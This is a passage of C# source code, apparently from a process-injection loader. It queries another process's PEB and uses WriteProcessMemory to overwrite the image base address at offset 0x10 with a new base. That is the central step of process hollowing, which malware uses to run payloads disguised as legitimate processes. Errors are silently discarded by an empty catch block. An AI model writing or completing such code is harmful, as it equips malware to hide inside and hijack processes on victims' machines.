                        PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                        uint retLen;
                        ZwQueryInformationProcess(hProcess, 0, ref pbi, 
                            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out retLen);
                        
                        IntPtr written;
                        if (WriteProcessMemory != null) WriteProcessMemory(hProcess, (IntPtr)((long)pbi.PebAddress + 0x10), 
                            BitConverter.GetBytes((long)newBase), 8, out written);
                    }
                }
                catch { }
            }

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate int ZwQueryInformationProcessDelegate(
                IntPtr ProcessHandle,
                int ProcessInformationClass,
                ref PROCESS_BASIC_INFORMATION ProcessInformation,
                uint ProcessInformationLength,
                out uint ReturnLength);
        }
        #endregion
    }
}
